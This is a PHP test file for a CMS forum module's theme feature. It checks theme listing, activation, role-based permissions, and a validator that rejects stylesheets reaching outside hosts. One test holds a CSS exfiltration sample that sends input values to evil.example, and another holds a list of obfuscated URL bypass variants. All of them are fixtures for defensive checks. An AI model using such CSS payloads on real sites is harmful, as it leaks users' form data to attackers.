<?php

namespace Tests\Feature\Modules;

use App\Auth\AdminRole;
use App\Models\Admin;
use App\Services\CmsSettings;
use App\Support\Modules\ModuleManager;
use App\Support\Modules\ModuleRuntime;
use App\Support\Themes\ThemeValidator;
use Illuminate\Filesystem\Filesystem;
use Illuminate\Foundation\Testing\RefreshDatabase;
use Illuminate\Support\Facades\Cache;
use Illuminate\Support\Facades\DB;
use KaevCMS\Modules\Forum\Services\ForumThemes;
use Tests\TestCase;

class ForumThemesTest extends TestCase
{
    use RefreshDatabase;

    private ?string $tempThemes = null;

    protected function setUp(): void
    {
        parent::setUp();
        $module = app(ModuleManager::class)->enable('forum');
        app(ModuleRuntime::class)->bootModule($module);
        Cache::flush();
    }

    protected function tearDown(): void
    {
        if ($this->tempThemes !== null) {
            (new Filesystem)->deleteDirectory($this->tempThemes);
        }
        parent::tearDown();
    }

    public function test_forum_tab_appears_under_themes_and_lists_bundled_themes(): void
    {
        $this->actingAs(Admin::factory()->create(), 'admin');

        $this->get('/admin/themes')->assertOk()
            ->assertSee('/admin/extensions/forum/themes', false);

        $this->get('/admin/extensions/forum/themes')->assertOk()
            ->assertSee('Frost')
            ->assertSee('Classic')
            ->assertSee('forum-themes/kaev-classic/preview.svg', false);
    }

    public function test_forum_uses_frost_until_the_owner_switches_to_classic(): void
    {
        $this->get('/forum')->assertOk()
            ->assertSee('forum-themes/kaev-frost/theme.css', false)
            ->assertDontSee('.forum-top{', false);

        $owner = Admin::factory()->create();
        $this->actingAs($owner, 'admin');
        $this->post('/admin/extensions/forum/themes/kaev-classic/activate')->assertRedirect();
        $this->assertSame('kaev-classic', app(CmsSettings::class)->get(ForumThemes::SETTING));
        $this->assertTrue(DB::table('audit_logs')->where('action', 'forum.theme_activated')->exists());

        auth('admin')->logout();
        $this->get('/forum')->assertOk()->assertSee('forum-themes/kaev-classic/theme.css', false);
    }

    public function test_appearance_roles_decide_who_may_switch(): void
    {
        $this->actingAs(Admin::factory()->create(['role' => AdminRole::Auditor]), 'admin');
        $this->get('/admin/extensions/forum/themes')->assertOk()->assertDontSee('/activate', false);
        $this->post('/admin/extensions/forum/themes/kaev-classic/activate')->assertForbidden();

        $this->actingAs(Admin::factory()->create(['role' => AdminRole::Editor]), 'admin');
        $this->get('/admin/extensions/forum/themes')->assertForbidden();

        $this->actingAs(Admin::factory()->create(['role' => AdminRole::Administrator]), 'admin');
        $this->post('/admin/extensions/forum/themes/kaev-classic/activate')->assertRedirect();
        $this->assertSame('kaev-classic', app(CmsSettings::class)->get(ForumThemes::SETTING));
    }

    public function test_a_stylesheet_that_reaches_other_sites_is_refused_and_falls_back(): void
    {
        $themes = $this->themesIn([
            'kaev-frost' => 'a{color:red}',
            'leaky' => 'input[value^="a"]{background:url(https://evil.example/a)}',
            'tidy' => '.forum-top{background:url(images/top.webp)}',
        ]);

        $leaky = $themes->inspect('leaky');
        $this->assertFalse($leaky['valid']);
        $this->assertTrue($themes->inspect('tidy')['valid']);

        $this->expectException(\RuntimeException::class);
        try {
            $themes->activate('leaky');
        } finally {
            // A broken theme chosen earlier (or edited later) never reaches the page.
            app(CmsSettings::class)->set(ForumThemes::SETTING, 'leaky');
            $this->assertSame('kaev-frost', $this->themesIn([])->activeSlug());
        }
    }

    public function test_css_check_blocks_every_way_out(): void
    {
        foreach (['a{color:red}', '.x:not(.y){}', 'a{background:url(img/x.png)}', 'a{background:url(data:image/png;base64,AA)}'] as $css) {
            $this->assertTrue(ForumThemes::cssStaysLocal($css), $css);
        }

        foreach ([
            '@import "x.css";',
            'a{background:url(https://e.example/x)}',
            'a{background:url(HTTPS:e.example)}',
            'a{background:url(//e.example/x)}',
            'a{background:url(\68ttps://e.example)}',
            'a{content:"/*"} b{background:url(http:e.example)} c{content:"*/"}',
            'a{background:image-set("https://e.example/x" 1x)}',
        ] as $css) {
            $this->assertFalse(ForumThemes::cssStaysLocal($css), $css);
        }
    }

    /** @param array<string, string> $styles */
    private function themesIn(array $styles): ForumThemes
    {
        $this->tempThemes ??= storage_path('framework/testing/forum-themes-'.bin2hex(random_bytes(4)));
        $files = new Filesystem;
        foreach ($styles as $slug => $css) {
            $files->ensureDirectoryExists($this->tempThemes.'/'.$slug);
            $files->put($this->tempThemes.'/'.$slug.'/theme.json', json_encode([
                'name' => ucfirst($slug), 'slug' => $slug, 'version' => '1.0.0', 'author' => 'Test',
            ]));
            $files->put($this->tempThemes.'/'.$slug.'/theme.css', $css);
        }

        return new ForumThemes(app(CmsSettings::class), app(ThemeValidator::class), $files, '0.10.0', $this->tempThemes);
    }
}
